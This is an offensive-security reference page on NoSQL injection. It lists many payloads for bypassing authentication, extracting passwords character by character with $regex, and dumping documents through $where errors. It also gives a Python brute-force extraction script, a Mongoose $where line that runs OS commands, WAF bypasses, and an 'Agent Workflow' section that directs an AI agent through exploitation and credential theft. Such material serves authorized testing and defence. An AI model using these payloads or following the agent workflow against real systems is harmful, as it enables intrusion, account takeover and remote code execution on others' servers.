# NoSQL Injection

> **Summary**: Injecting NoSQL query operators or JavaScript into database queries to bypass authentication, extract data, or execute server-side code.
> **Impact**: Authentication bypass, data exfiltration, denial of service, remote code execution (via server-side JS).
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Application uses MongoDB, CouchDB, or other NoSQL databases
- Parameters are passed as JSON objects or URL-encoded arrays (e.g., `param[$ne]=`)
- Error messages reference MongoDB operators, BSON, or Mongoose
- Application uses Node.js/Express with Mongoose or native MongoDB driver

### Automated Detection

```bash
# NoSQLMap
python nosqlmap.py -u "http://<TARGET>/login" -p "username,password"

# nosqli
nosqli scan -t "http://<TARGET>/login" -p "username"
```

### Manual Detection

1. **Operator injection test**: Replace a parameter value with `{"$ne": ""}` or append `[$ne]=` to URL params
   - Success: Different response (e.g., login bypass, additional data returned)
2. **Type confusion**: Send an array where a string is expected: `param[]=value`
3. **JavaScript injection**: Try `' || true || ''=='` in string-based query contexts
4. **Time-based blind**: Inject `{"$where": "sleep(5000)"}` and measure response time

## Exploitation

### Prerequisites

- Application passes user input into NoSQL queries without sanitization
- MongoDB operators (`$ne`, `$gt`, `$regex`, `$where`) are not stripped from input
- For `$where` attacks: server-side JavaScript must be enabled on MongoDB (disabled by default in v7.0+)

### Step-by-Step

1. **Identify NoSQL backend** -- Look for MongoDB error messages, JSON-based APIs, or Node.js stack
   - Success: Error messages or technology fingerprinting confirms NoSQL
2. **Test operator injection** -- Inject `$ne`, `$gt`, or `$regex` operators
   - Success: Altered query behavior (bypass auth, return extra records)
3. **Extract data** -- Use `$regex` for character-by-character extraction
   - Success: Boolean differences reveal data one character at a time
4. **Test JavaScript injection** -- If `$where` is available, inject JS for RCE
   - Success: Server executes arbitrary JavaScript

### Payloads (organized by context)

---

#### Authentication Bypass

**URL-Encoded (GET/POST form)**:
```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

**JSON Body**:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}
```

---

#### Data Extraction via $regex

**Determine field length**:
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
username[$ne]=toto&password[$regex]=.{8}
```

**Extract character-by-character**:
```
username[$ne]=toto&password[$regex]=^a.*
username[$ne]=toto&password[$regex]=^b.*
username[$ne]=toto&password[$regex]=^m.*
username[$ne]=toto&password[$regex]=^md.*
username[$ne]=toto&password[$regex]=^mdp$
```

**JSON equivalent**:
```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^ab"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^abc"}}
```

---

#### Server-Side JavaScript Injection ($where)

```
{"$where": "this.username == 'admin' && this.password == 'a' || 'a' == 'a'"}
```

**Tautology bypass**:
```
' || true || ''=='
" || true || ""=="
```

**SQL-like syntax in MongoDB**:
```
' || 1==1//
' || 1==1%00
admin' || 'a'=='a
```

**Error-based extraction (exfiltrate documents via errors)**:
```json
{"$where": "this.username=='admin'; throw new Error(JSON.stringify(this));"}
```

**Time-based blind**:
```
';sleep(5000);
';it=new Date();do{pt=new Date();}while(pt-it<5000);
{"$where": "sleep(5000) || true"}
```

---

#### Cross-Collection Data Access ($lookup)

When the application uses `aggregate()` instead of `find()`:

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "result",
      "pipeline": [
        {
          "$match": {
            "password": {
              "$regex": "^.*"
            }
          }
        }
      ]
    }
  }
]
```

---

#### GraphQL -> MongoDB Filter Confusion

```graphql
query {
  users(filter: { username: { $ne: "" } }) {
    _id
    email
    password
  }
}
```

Variables:
```json
{"f": {"$ne": {}}}
```

---

#### PHP-Specific (Array Injection)

PHP's `parse_str()` allows sending arrays via URL params:

```
username[$ne]=1&password[$ne]=1
username[$regex]=^admin&password[$gt]=
```

---

#### Mongoose populate() RCE (CVE-2024-53900 / CVE-2025-23061)

When `populate()` is used with `match`, operators are passed verbatim to MongoDB:

```
GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')
```

### Blind NoSQL Injection Script

```python
import requests, string

url = "http://<TARGET>/login"
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"
password = ""

while True:
    found = False
    for char in alphabet:
        payload = {"username": "admin", "password[$regex]": "^" + password + char}
        r = requests.post(url, data=payload)
        if "Welcome" in r.text or r.status_code == 302:
            password += char
            print(f"[+] Found: {password}")
            found = True
            break
    if not found:
        print(f"[*] Final password: {password}")
        break
```

### Proof of Concept

1. Send normal login: `username=admin&password=wrong` -> Login fails
2. Send injected login: `username=admin&password[$ne]=wrong` -> Login succeeds
3. Document the differing response to prove authentication bypass

## Bypasses

- **WAF bypass**: URL-encode operators (`%24ne` instead of `$ne`)
- **Double encoding**: `%2524ne` may bypass some filters
- **JSON vs URL-encoded**: Switch between content types to bypass input validation
- **Nested operators**: `{"$or": [{"$where": "..."}]}` to bypass top-level `$where` filtering
- **Unicode**: Use unicode equivalents for operator characters

## Escalation

- NoSQL Auth Bypass -> Access admin panel -> Full application compromise
- `$where` injection -> Server-side JavaScript execution -> RCE
- `$regex` extraction -> Credential theft -> Account takeover
- NoSQL + [GraphQL](graphql.md) -> Mass data extraction
- NoSQL + [Command Injection](command-injection.md) via `$where` -> OS-level access

## MongoDB Query Operators Reference

| Type | Operator | Description |
|------|----------|-------------|
| Comparison | `$eq` | Equal to |
| Comparison | `$ne` | Not equal to |
| Comparison | `$gt` / `$gte` | Greater than / Greater or equal |
| Comparison | `$lt` / `$lte` | Less than / Less or equal |
| Comparison | `$in` | Matches any value in array |
| Comparison | `$nin` | Matches none in array |
| Logical | `$and` | Both conditions must match |
| Logical | `$or` | Either condition matches |
| Logical | `$not` | Negates a condition |
| Logical | `$nor` | Neither condition matches |
| Evaluation | `$regex` | Matches regular expression |
| Evaluation | `$where` | Evaluates JavaScript expression |
| Evaluation | `$mod` | Modulo operation |

## Tools

| Tool | Usage |
|------|-------|
| [NoSQLMap](https://github.com/codingo/NoSQLMap) | Automated NoSQL injection and exploitation |
| [nosqli](https://github.com/Charlie-belmer/nosqli) | `nosqli scan -t <URL>` -- Go-based scanner |
| [NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite) | Comprehensive NoSQL attack toolkit |
| [StealthNoSQL](https://github.com/ImKKingshuk/StealthNoSQL) | Stealthy NoSQL injection scanner |
| [mongosh](https://www.mongodb.com/docs/mongodb-shell/) | `mongosh mongodb://<HOST>:27017` -- direct MongoDB interaction |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. Identify the database technology behind `<TARGET>`: look for MongoDB error messages (e.g., `MongoError`, `BSON`), Mongoose stack traces, or CouchDB responses
2. Check if the application uses Node.js/Express with JSON APIs (common MongoDB stack)
3. Identify endpoints that accept user input for queries: login forms, search functions, user lookups, data filters
4. Check if parameters are passed as JSON objects or URL-encoded arrays (e.g., `param[$ne]=`)
5. Run automated scanner:
   ```bash
   nosqli scan -t "https://<TARGET>/<ENDPOINT>" -p "<PARAM>"
   python nosqlmap.py -u "https://<TARGET>/<ENDPOINT>" -p "<PARAM1>,<PARAM2>"
   ```
6. Look for GraphQL endpoints that pass filter arguments directly to MongoDB queries

### Phase 2: Validation
1. **Operator injection test**: Replace a parameter value with `{"$ne": ""}` or append `[$ne]=` to URL params:
   - JSON: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
   - URL: `username[$ne]=invalid&password[$ne]=invalid`
2. Compare the response to a normal request: if operator injection returns a different result (e.g., login succeeds, extra data returned), NoSQL injection is confirmed
3. Test additional operators:
   - `{"$gt": ""}` -- greater than empty string (matches everything)
   - `{"$regex": ".*"}` -- matches any value
   - `{"$exists": true}` -- matches if field exists
4. **Type confusion test**: Send an array where a string is expected: `param[]=value`
5. **JavaScript injection test**: If `$where` may be available:
   ```json
   {"$where": "sleep(5000) || true"}
   ```
   Measure response time: >5 seconds indicates JS execution
6. Switch between `Content-Type: application/json` and `application/x-www-form-urlencoded` to find which parsing path is vulnerable

### Phase 3: Exploitation
1. **Authentication bypass**: Use operator injection to bypass login:
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
   ```
   Or target a specific user:
   ```json
   {"username": "admin", "password": {"$gt": ""}}
   ```
2. **Blind data extraction via $regex**: Extract data character by character:
   ```json
   {"username": "admin", "password": {"$regex": "^a"}}
   {"username": "admin", "password": {"$regex": "^ab"}}
   {"username": "admin", "password": {"$regex": "^abc"}}
   ```
   Automate with a script, iterating through the character set until the full value is extracted
3. **$where JavaScript injection** (if enabled): Extract data via error messages:
   ```json
   {"$where": "this.username=='admin'; throw new Error(JSON.stringify(this));"}
   ```
4. **Cross-collection data access** via `$lookup` in aggregate pipelines:
   ```json
   [{"$lookup": {"from": "<OTHER_COLLECTION>", "as": "result", "pipeline": [{"$match": {"password": {"$regex": "^.*"}}}]}}]
   ```
5. Document each finding with: endpoint, parameter, payload, and resulting behavior change

### Phase 4: Escalation
1. **Authentication bypass -> Admin access**: Log in as admin user and access administrative functionality
2. **$where injection -> RCE**: If server-side JavaScript is enabled, execute OS commands:
   ```
   GET /endpoint?param[$where]=global.process.mainModule.require('child_process').execSync('<CMD>')
   ```
3. **$regex extraction -> Credential theft**: Extract all user passwords/hashes and use them for account takeover
4. **Mass data dump**: Combine `$ne` or `$gt` with pagination to enumerate all records in a collection
5. Chain with [GraphQL](graphql.md): GraphQL filter arguments passed to MongoDB queries can expose NoSQL injection at the GraphQL layer
6. Chain with [Command Injection](command-injection.md): `$where` JavaScript injection can escalate to OS-level access

## Decision Tree

```
Identify NoSQL backend (MongoDB, CouchDB, etc.)
├── Test operator injection
│   ├── JSON body: {"param": {"$ne": ""}}
│   │   ├── Different response? → NoSQL injection confirmed
│   │   │   ├── Login endpoint? → Authentication bypass
│   │   │   ├── Search/filter endpoint? → Data extraction
│   │   │   └── Test $regex for blind extraction
│   │   └── Same response → Try URL-encoded: param[$ne]=
│   ├── URL params: param[$ne]=&param2[$gt]=
│   │   └── Different response? → NoSQL injection confirmed
│   └── No operator injection possible
│       ├── Test $where JavaScript injection
│       │   ├── Time-based: {"$where": "sleep(5000)"} → Delay? → JS injection confirmed
│       │   ├── Error-based: throw new Error(JSON.stringify(this)) → Data in error?
│       │   └── Tautology: ' || true || ''==' → Auth bypass?
│       └── All tests fail → Not vulnerable
├── Operator injection confirmed
│   ├── Extract data via $regex (character by character)
│   ├── Bypass authentication via $ne/$gt/$in
│   └── Enumerate users via $regex on username field
└── $where injection confirmed
    ├── Extract full documents via error messages
    ├── RCE via process.mainModule.require('child_process')
    └── Time-based blind extraction via sleep()
```

## Success Criteria
- **Authentication bypass**: Login succeeds using NoSQL operators (`$ne`, `$gt`, `$regex`) without knowing valid credentials
- **Data extraction**: Sensitive data (passwords, tokens, PII) is extracted from the database via blind `$regex` injection or error-based `$where` injection
- **RCE**: OS commands execute on the server via `$where` JavaScript injection (confirmed via DNS/HTTP callback or command output)

---

## References

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [NullSweep - NoSQL Injection Cheatsheet](https://nullsweep.com/nosql-injection-cheatsheet/)
- [SensePost - NoSQL Error-Based Injection](https://sensepost.com/blog/2025/nosql-error-based-injection/)
- [Mongoose CVE-2024-53900 / CVE-2025-23061](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900)
- [Rocket.Chat CVE-2023-28359](https://nvd.nist.gov/vuln/detail/CVE-2023-28359)
- [PortSwigger - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)

**See also**: [GraphQL](graphql.md) | [Command Injection](command-injection.md)
